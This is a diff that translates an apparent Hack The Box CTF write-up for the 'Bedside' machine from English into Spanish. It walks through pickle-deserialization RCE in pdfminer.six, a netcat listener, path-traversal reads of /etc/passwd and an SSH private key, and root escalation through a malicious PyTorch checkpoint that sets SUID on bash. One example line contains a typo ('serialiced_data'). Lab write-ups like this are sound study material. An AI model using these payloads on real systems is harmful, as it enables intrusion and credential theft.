@@ -1,10 +1,10 @@
 ---
 created: 2026-8-6
-description: Bedside is a Linux box hosting a file upload application vulnerable to CVE-2025-70559, allowing remote code execution through unsafe pickle deserialization in pdfminer.six. The foothold involves exploiting a path traversal vulnerability in an internal image viewer to escape the container and retrieve an SSH private key. Privilege escalation is achieved by abusing an unrestricted PyTorch checkpoint loader to execute malicious pickle payloads as root.
+description: Bedside es una máquina Linux que aloja una aplicación de subida de archivos vulnerable a CVE-2025-70559, lo que permite la ejecución remota de código mediante la deserialización insegura de pickle en pdfminer.six. El acceso inicial implica explotar una vulnerabilidad de path traversal en un visor de imágenes interno para escapar del contenedor y recuperar una clave privada SSH. La escalada de privilegios se consigue abusando de un cargador de checkpoints de PyTorch sin restricciones para ejecutar payloads maliciosos de pickle como root.
 ---
 
 #htb #medium #linux #web #subdomains #pdfminer #cve-2025-70559 #pickle #deserialization #pdf #rce #containers #docker #container-escape #path-traversal #sudo #pytorch #pytorch-checkpoint #machine-learning
-# Enumeration
+# Enumeración
 ## Nmap
 
 ```bash
@@ -14,7 +14,7 @@ Discovered open port 80/tcp on 10.129.248.191
 Discovered open port 22/tcp on 10.129.248.191
 ```
 
-Opened ports: 80,22
+Puertos abiertos: 80,22
 
 ```bash
 [hvidal@fedora] ~/d/h/h/m/b/scan
@@ -26,34 +26,34 @@ PORT   STATE SERVICE VERSION
 |_http-server-header: Apache/2.4.68 (Debian)
 ```
 
-Add `bedside.htb` to `/etc/hosts`.
+Añadir `bedside.htb` a `/etc/hosts`.
 ```bash
 [hvidal@fedora] ~/d/h/h/m/b/scan
 ❯ echo "10.129.248.191 bedside.htb" | sudo tee -a /etc/hosts
 ```
 
-## Subdomains
+## Subdominios
 
-Apache 2.4.68 is not known to be vulnerable, the main page does not expose anything interesting and directory enumeration against `bedside.htb` does not reveal anything interesting.
+Apache 2.4.68 no presenta vulnerabilidades conocidas, la página principal no expone nada interesante y la enumeración de directorios contra `bedside.htb` tampoco revela nada relevante.
 
-Try enumerating subdomains.
+Probar a enumerar subdominios.
 ```bash
 [hvidal@fedora] ~/d/h/h/m/b/scan
 ❯ ffuf -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.bedside.htb" -fw 21 -u http://bedside.htb/
 research                [Status: 200, Size: 3152]
 ```
 
-Add `research.bedside.htb` to `/etc/hosts`.
+Añadir `research.bedside.htb` a `/etc/hosts`.
 ```bash
 [hvidal@fedora] ~/d/h/h/m/b/scan
 ❯ sudo sed -i '/bedside\.htb/ s/$/ research.bedside.htb/' /etc/hosts
 ```
 
-`research.bedside.htb` only exposes a file upload feature which accepts the formats: `jpeg`, `jpg`, `png`, `bmp`, `tiff`, `dcm`, `pdf`, `gz`, `zip`.
+`research.bedside.htb` solo expone una funcionalidad de subida de archivos que acepta los formatos: `jpeg`, `jpg`, `png`, `bmp`, `tiff`, `dcm`, `pdf`, `gz`, `zip`.
 
 ![[file_formats.png]]
 
-Inspecting the HTTP response headers reveals that the application uses `pdfminer.six`, which is vulnerable to CVE-2025-70559.
+Al inspeccionar las cabeceras de respuesta HTTP se observa que la aplicación utiliza `pdfminer.six`, que es vulnerable a CVE-2025-70559.
 ```bash
 [hvidal@fedora] ~/d/h/h/m/b/content
 ❯ curl -i http://research.bedside.htb/
@@ -63,14 +63,14 @@ X-Powered-By: pdfminer.six
 Content-Type: text/html; charset=UTF-8
 ```
 
-# Exploitation
-## Vulnerability description 
+# Explotación
+## Descripción de la vulnerabilidad
 
-[CVE-2025-70559](https://github.com/advisories/GHSA-f83h-ghpp-7wcc) affects `pdfminer.six` due to unsafe usage of Python's `pickle` module when loading CMap files.
+[CVE-2025-70559](https://github.com/advisories/GHSA-f83h-ghpp-7wcc) afecta a `pdfminer.six` debido al uso inseguro del módulo `pickle` de Python al cargar archivos CMap.
 
-The library loads and deserializes `.pickle.gz` files using the `pickle` Python module.
+La biblioteca carga y deserializa archivos `.pickle.gz` utilizando el módulo `pickle` de Python.
 
-Since `pickle` executes the reconstruction logic embedded in serialized objects, deserializing attacker-controlled data can lead to arbitrary code execution. For example:
+Dado que `pickle` ejecuta la lógica de reconstrucción incrustada en los objetos serializados, deserializar datos controlados por un atacante puede conducir a la ejecución arbitraria de código. Por ejemplo:
 ```python
 class Evil:
     def __reduce__(self):
@@ -78,24 +78,24 @@ class Evil:
         return (os.system, ("touch /tmp/pwned",))
 
 serialized_data = pickle.dumps(Evil())
-deserialized_data = pickle.loads(serialiced_data)  # Creates /tmp/pwned
+deserialized_data = pickle.loads(serialiced_data)  # Crea /tmp/pwned
 ```
 
-If an attacker can control the CMap loaded by `pdfminer.six`, the library will deserialize it using `pickle`, resulting in arbitrary code execution.
+Si un atacante puede controlar el CMap cargado por `pdfminer.six`, la biblioteca lo deserializará usando `pickle`, lo que resultará en ejecución arbitraria de código.
 
-While we can upload PDFs and the application displays the following message:
+Aunque podemos subir PDFs y la aplicación muestra el siguiente mensaje:
 >*All files submitted here are for staff use only and are strictly confidential. Certain file formats may be converted to standardized formats before being used for AI training.*
 
-It is reasonable to suspect that the PDFs are being parsed.
+Es razonable sospechar que los PDFs están siendo procesados.
 
-## Evil serialization
+## Serialización maliciosa
 
-To trigger the vulnerability, we need two files:
-- A malicious `.pickle.gz` file containing the payload.
-- A PDF referencing a custom `/Font` with an `/Encoding` field pointing to the malicious CMap.
-When `pdfminer.six` processes the PDF, it attempts to load the referenced CMap and deserializes our malicious `.pickle.gz` file, resulting in arbitrary code execution.
+Para explotar la vulnerabilidad, necesitamos dos archivos:
+- Un archivo `.pickle.gz` malicioso que contenga el payload.
+- Un PDF que haga referencia a una `/Font` personalizada con un campo `/Encoding` que apunte al CMap malicioso.
+Cuando `pdfminer.six` procesa el PDF, intenta cargar el CMap referenciado y deserializa nuestro archivo `.pickle.gz` malicioso, lo que da lugar a ejecución arbitraria de código.
 
-First of all create the evil `.pickle.gz` file with the following script.
+En primer lugar, crear el archivo `.pickle.gz` malicioso con el siguiente script.
 ```python
 import pickle
 import gzip
@@ -108,8 +108,8 @@ class Evil:
 open("evil.pickle.gz", "wb").write(gzip.compress(pickle.dumps(Evil())))
 ```
 
-Next, create a minimal valid PDF with the `/Font` and `/Encoding` fields.
-The `/Encoding` field must reference the absolute path to the uploaded CMap, which is given by the web app: `/var/www/research.bedside.htb/uploads`.
+A continuación, crear un PDF mínimo válido con los campos `/Font` y `/Encoding`.
+El campo `/Encoding` debe hacer referencia a la ruta absoluta del CMap subido, que es la indicada por la aplicación web: `/var/www/research.bedside.htb/uploads`.
 ```python
 encoding = "/var/www/research.bedside.htb/uploads/evil"
 encoding = encoding.replace("/","#2F")
@@ -139,24 +139,24 @@ with open("trigger.pdf", "wb") as f:
     f.write(pdf.encode())
 ```
 
-Start a listener.
+Iniciar un listener.
 ```bash
 [hvidal@fedora] ~/d/h/h/m/b/content
 ❯ nc -lnvp 4444
 ```
 
-Then upload `evil.pickle.gz` and `trigger.pdf` to the app.
+Luego, subir `evil.pickle.gz` y `trigger.pdf` a la aplicación.
 
-## Post-exploitation
+## Post-explotación
 
-Check if this is a Docker container.
+Comprobar si se trata de un contenedor Docker.
 ```bash
 datawrangler@data-wrangler:/app$ ls -la /.dockerenv
 -rwxr-xr-x 1 root root 0 Nov 11  2025 /.dockerenv
 ```
-This shell is inside a Docker container, not on the host.
+Esta shell se encuentra dentro de un contenedor Docker, no en el host.
 
-In `/tmp` a custom port scanner is available, use it to see if there is any hidden service.
+En `/tmp` hay disponible un escáner de puertos personalizado; usarlo para ver si existe algún servicio oculto.
 ```bash
 datawrangler@data-wrangler:/tmp$ bash portscan.sh 127.0.0.1
 22
@@ -164,28 +164,28 @@ datawrangler@data-wrangler:/tmp$ bash portscan.sh 127.0.0.1
 3000
 ```
 
-identify the service listening on port 3000.
+Identificar el servicio que escucha en el puerto 3000.
 ```bash
 datawrangler@data-wrangler:/tmp$ curl -I 127.0.0.1:3000
 HTTP/1.1 200 OK
 ```
-Port 3000 serves an image viewer application.
+El puerto 3000 sirve una aplicación de visor de imágenes.
 
-Test the application for path traversal.
+Probar la aplicación en busca de path traversal.
 ```bash
 datawrangler@data-wrangler:/tmp$ curl -o /dev/null -w "%{http_code}\n" --path-as-is 'http://127.0.0.1:3000/../../../../etc/passwd'
 200
 ```
 
-The application is vulnerable to path traversal and the files are being read from the host filesystem rather than the container.
+La aplicación es vulnerable a path traversal y los archivos se están leyendo desde el sistema de archivos del host en lugar del contenedor.
 ```bash
 datawrangler@data-wrangler:/tmp$ curl --path-as-is 'http://127.0.0.1:3000/../../../../etc/passwd' | grep bash
 root:x:0:0:root:/root:/bin/bash
 developer:x:1000:1000:developer,,,:/home/developer:/bin/bash
 ```
-The `/etc/passwd` displays the user developer which is not in the container.
+El `/etc/passwd` muestra el usuario developer, que no existe en el contenedor.
 
-Use it to read the `developer`'s SSH private key.
+Usarlo para leer la clave privada SSH de `developer`.
 ```bash
 datawrangler@data-wrangler:/tmp$ curl --path-as-is 'http://127.0.0.1:3000/../../../../../home/developer/.ssh/id_rsa'
 -----BEGIN OPENSSH PRIVATE KEY-----
@@ -197,7 +197,7 @@ RklXPKvABvvNPkg5mi0AAAAAEWRldmVsb3BlckBiZWRzaWRlAQIDBA==
 -----END OPENSSH PRIVATE KEY-----
 ```
 
-Connect to the host via SSH.
+Conectarse al host mediante SSH.
 ```bash
 [hvidal@fedora] ~/d/h/h/m/b/content
 ❯ chmod 600 id_rsa
@@ -207,25 +207,25 @@ Connect to the host via SSH.
 developer@bedside:~$
 ```
 
-Read the user flag.
+Leer la flag de usuario.
 ```bash
 developer@bedside:~$ cat user.txt
 ```
 
-# Privilege escalation
+# Escalada de privilegios
 
-## Enumeration
+## Enumeración
 
-`developer` can run a suspicious command as `root` without password.
+`developer` puede ejecutar un comando sospechoso como `root` sin contraseña.
 ```bash
 developer@bedside:~$ sudo -l
 User developer may run the following commands on bedside:
     (ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py
 ```
 
-The purpose of the script is to automate the training of a deep learning model using PyTorch and MONAI.
+El propósito del script es automatizar el entrenamiento de un modelo de deep learning utilizando PyTorch y MONAI.
 
-When executed, the script builds a dataset from `/datastore/processed`. If no samples are available, it moves valid files from `/datastore/staging` into `/datastore/processed`. Once a dataset is perpared, it looks for the most recent checkpoint under `/datastore/checkpoints` and restores it using `CheckpointLoader`.
+Cuando se ejecuta, el script construye un dataset a partir de `/datastore/processed`. Si no hay muestras disponibles, mueve archivos válidos desde `/datastore/staging` a `/datastore/processed`. Una vez preparado el dataset, busca el checkpoint más reciente en `/datastore/checkpoints` y lo restaura usando `CheckpointLoader`.
 
 ```python
 DATASTORE_ROOT = Path("/datastore")
@@ -240,8 +240,8 @@ def find_latest_checkpoint(checkpoint_dir: Path):
 	latest_ckpt = find_latest_checkpoint(CHECKPOINT_DIR)
 ```
 
-When the checkpoint is located, the script loads it using `CheckpointLoader` without any validation.
-However, at least one valid image must exist in `/datastore/processed`, otherwise the script exits before reaching the checkpoint loading stage.
+Cuando localiza el checkpoint, el script lo carga usando `CheckpointLoader` sin ninguna validación.
+Sin embargo, debe existir al menos una imagen válida en `/datastore/processed`, de lo contrario el script termina antes de llegar a la etapa de carga del checkpoint.
 
 ```python
 if n_data == 0:
@@ -261,18 +261,18 @@ if latest_ckpt:
     loader(engine)
 ```
 
-`CheckpointLoader` restores checkpoints using `torch.load()` which uses the `pickle` module to deserialize the data, resulting in a possible remote code execution if an evil checkpoint is submitted in `CHECKPOINT_DIR`. 
+`CheckpointLoader` restaura los checkpoints usando `torch.load()`, que emplea el módulo `pickle` para deserializar los datos, lo que da lugar a una posible ejecución remota de código si se coloca un checkpoint malicioso en `CHECKPOINT_DIR`.
 
-## Exploitation
+## Explotación
 
-Check the permissions of `/datastore`.
+Comprobar los permisos de `/datastore`.
 ```bash
 developer@bedside:~$ ls -ld /datastore/
 drwxrwx--- 8 datawrangler dataops 4096 Jul 13 14:00 /datastore/
 ```
-`developer` cannot write into `/datastore`, but `datawrangler` can, which is the user of the container.
+`developer` no puede escribir en `/datastore`, pero `datawrangler` sí, que es el usuario del contenedor.
 
-First, create the malicious `.pt` file, which will set the SUID bit on `/bin/bash`, with the following script:
+Primero, crear el archivo `.pt` malicioso, que establecerá el bit SUID en `/bin/bash`, con el siguiente script:
 ```python
 import torch
 
@@ -284,35 +284,35 @@ class Evil:
 torch.save(Evil(), "evil_checkpoint.pt")
 ```
 
-Create a Zip archive containing the malicious checkpoint and any valid image, and upload it to `research.bedside.htb`.
+Crear un archivo Zip que contenga el checkpoint malicioso y cualquier imagen válida, y subirlo a `research.bedside.htb`.
 ```bash
 [hvidal@fedora] ~/d/h/h/m/b/c/evil_torch
 ❯ zip checkpoint.zip evil_checkpoint.pt image.png
 ```
 
-Extract the archive in the container.
+Extraer el archivo en el contenedor.
 ```bash
 datawrangler@data-wrangler:/tmp$ cp /var/www/research.bedside.htb/uploads/checkpoint.zip .
 
 datawrangler@data-wrangler:/tmp$ python3 -c "import zipfile; zipfile.ZipFile('checkpoint.zip').extractall('.')"
 ```
 
-Copy the evil `.pt` to `/datastore/checkpoints`.
+Copiar el `.pt` malicioso a `/datastore/checkpoints`.
 ```bash
 datawrangler@data-wrangler:/tmp$ cp evil_checkpoint.pt /datastore/checkpoints
 ```
 
-copy the image to `/datastore/processed`.
+Copiar la imagen a `/datastore/processed`.
 ```bash
 datawrangler@data-wrangler:/tmp$ cp image.png /datastore/processed
 ```
 
-And remove all the `.txt` files from `/datastore/processed` and `/datastore/staging/`, because `.txt` files are included in `ALLOWED_EXTS`, but the image transforms cannot parse them, causing the training process to fail before the malicious checkpoint is loaded.
+Y eliminar todos los archivos `.txt` de `/datastore/processed` y `/datastore/staging/`, porque los archivos `.txt` están incluidos en `ALLOWED_EXTS`, pero las transformaciones de imagen no pueden procesarlos, lo que provoca que el proceso de entrenamiento falle antes de que se cargue el checkpoint malicioso.
 ```bash
 datawrangler@data-wrangler:/tmp$ rm /datastore/staging/*.txt /datastore/processed/*.txt
 ```
 
-Run the script with `sudo` as `developer`.
+Ejecutar el script con `sudo` como `developer`.
 ```bash
 developer@bedside:~$ sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py
 2026-08-06 13:29:23,458 | INFO | Device: cpu
@@ -321,14 +321,13 @@ developer@bedside:~$ sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py
 2026-08-06 13:29:23,789 | INFO | Found checkpoint /datastore/checkpoints/evil_checkpoint.pt, loading with CheckpointLoader (callable mode)...
 ```
 
-Execute `bash -p` to obtain a root shell.
+Ejecutar `bash -p` para obtener una shell de root.
 ```bash
 developer@bedside:/tmp$ bash -p
 bash-5.2$
 ```
 
-Read the `root` flag.
+Leer la flag de `root`.
 ```bash
 bash-5.2$ cat /root/root.txt
 ```
-
